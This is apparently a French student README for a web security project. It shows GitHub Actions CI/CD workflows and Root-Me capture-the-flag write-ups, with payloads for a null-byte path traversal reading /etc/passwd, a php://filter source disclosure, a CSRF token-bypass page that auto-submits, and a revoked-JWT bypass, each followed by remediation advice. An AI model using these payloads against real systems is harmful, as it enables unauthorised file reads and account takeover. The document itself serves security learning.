# Projet Sécurité du Web

## Membres du groupes
- LOUNADI Nassim
- DEHIL Sami
- BATISTA Maxime

## Screenshots

![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CD_Success.png)
![Screenshot2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CI_Success.png)
![Screenshot3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/DockerHub_Image.png)
![Screenshot4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/AllWorkflowsRuns.png)

## CI.yml

```yaml
name: CI

on:
  push:
    branches:
      - main
      - master
  workflow_dispatch:

permissions:
  contents: read
  security-events: write
  actions: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.8", "3.9", "3.10"]

    steps:
      - name: checkout
        uses: actions/checkout@v5

      - name: Python ${{ matrix.python-version }}
        uses: actions/setup-python@v6
        with:
          python-version: ${{ matrix.python-version }}

      - name: dependencies
        run: |
          python -m pip install --upgrade pip
          pip install flake8 pytest

      - name: flake8
        run: |
          flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
          flake8 . --count --exit-zero --statistics

      - name: pytest
        run: pytest tests/

  trivy-scan:
    runs-on: ubuntu-latest

    steps:
      - name: checkout
        uses: actions/checkout@v5

      - name: trivy FS mode
        uses: aquasecurity/trivy-action@0.33.1
        with:
          scan-type: 'fs'
          format: 'sarif'
          output: 'results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: upload
        uses: github/codeql-action/upload-sarif@v4
        with:
          sarif_file: results.sarif

```

## CD.yml

```yaml
name: CD

on:
  workflow_run:
    workflows: ["CI"]
    types:
      - completed
    branches:
      - main
      - master

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}

    steps:
      - name: checkout
        uses: actions/checkout@v5

      - name: login
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}

      - name: build and push
        id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          file: ./Dockerfile
          push: true
          tags: ${{ secrets.DOCKER_USERNAME }}/ci-cd:latest


```

## Challenges

### 1 | File path traversal, validation of file extension with null byte bypass

D'après le sujet, on se doute qu'il faut ajouter un null byte (%00) lors de l'appel d'une image

Ne pas oublier d'ajouter les images dans burp pour les intercepter :

![Step 0](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/1_file_path_traversal_validation_of_file_extension_with_null_byte_bypass/0.png)

Sur la page d'accueil, on remarque que les images sont chargées via un parmètre 'filename', on peut donc tenter une inclusion de fichier avec un path traversal + null byte :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/1_file_path_traversal_validation_of_file_extension_with_null_byte_bypass/1.png)

Payload :

```bash
../../../../../etc/passwd%00.jpg
```

Pour se protéger contre cette vulnérabilité, if faut empêcher les caractères spéciaux dans les entrées utilisateurs, et si possible utiliser une white list pour les fichiers autorisés.

[Source](https://www.chiny.me/null-byte-injection-14-7.php)

[Source](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

### 2 | PHP Filters

Utilisation du filtre 'php://filter/convert' avec base64-encode pour lire le code source PHP depuis l'include via le paramètre 'inc' :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/1.png)

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/2.png)

Même principe pour lire le fichier login : 

![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/3.png)

![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/4.png)

On se rend compte de l'existance d'un fichier config.php, on applique la même technique pour le lire :

![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/5.png)

![Step 6](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/6.png)

Payload :

```bash
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
```

Pour s'affranchir de cette vulnérabilité, il suffit d'appliquer le principe de "Never trust no one" en validant et en nettoyant les entrées utilisateurs avant de les utiliser dans des fonctions sensibles comme include(). Ou simplement ne pas utiliser include() dans ce cas précis.

[Source](https://faun.pub/good-practices-how-to-sanitize-validate-and-escape-in-php-3-methods-719c9fce99d6?gi=fecb20f8fd00)

[Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-for-url-contexts)

### 3 | CSRF Contournement de Jeton

Création d'un compte :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/1.png)

Récupération du template du formulaire de profil utilisateur :

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/2.png)

Payload :

```html
<html>
    <form id="profile" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="post" enctype="multipart/form-data">
        <div>
            <label>Username:</label>
            <input id="username" type="text" name="username" value="change_me_user">
        </div>
        <br>		
        <div>
            <label>Status:</label>
            <input id="status" type="checkbox" name="status" checked>
        </div>
        <br>
        <input id="token" type="hidden" name="token" value="" />
        <button type="submit">Submit</button>
    </form>

    <script>
        const request = new XMLHttpRequest();
        request.open('GET', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
        request.send();

        const token = (request.responseText.match(/name="token" value="([a-zA-Z0-9]+)"/))[1];

        const tokenField = document.getElementById('token')
        tokenField.setAttribute('value', token)

        const form = document.getElementById('profile');
        form.submit();
    </script>
</html>

```

Attendre le passage de l'administrateur sur la demande de contact :

![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/3.png)

Pour empêcher cette vulnérabilité, il est possible d'utiliser une validation au niveau de l'input utilisateur ("Never trust no one").
Comme "DOMPurify.sanitize(payload)"

![Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)

### 4 | JWT Jeton révoqué

Après avoir testé plusieurs payloads, d'avoir changé d'encodage, j'ai finalement essayé de changer le token en lui même (vu que la blacklist l'identifie en dur).

Recherche sur une sorte de null byte en base64 :

[Recherche](https://www.reddit.com/r/ProgrammerTIL/comments/6e6vbu/til_base64_encoded_strings_have_at_the_end_when)

La signature étant tronquée, il est donc possible d'ajouter des caractères "=" après le token si la longueur n'est pas divisible par 3.

Récupération d'un token valide avec l'utilisateur admin :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_JWT_jeton_revoque/1.png)

La signature est tronquée et a pour longueur 43

3 * 14 = 42

3 * 15 = 45

Ajout de 1 ou 2 "=" à la fin du token :

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_JWT_jeton_revoque/2.png)

Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser une bibliothèque officielle pour la gestion des JWT, ou d'utiliser une white liste, ou simplement strip les "=" des tokens récupérer via les requêtes utilisateurs.

[Source](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_3)

### 5 |

### 6 |

### 7 |

### 8 |

### 9 |

### 10 |

### 11 |
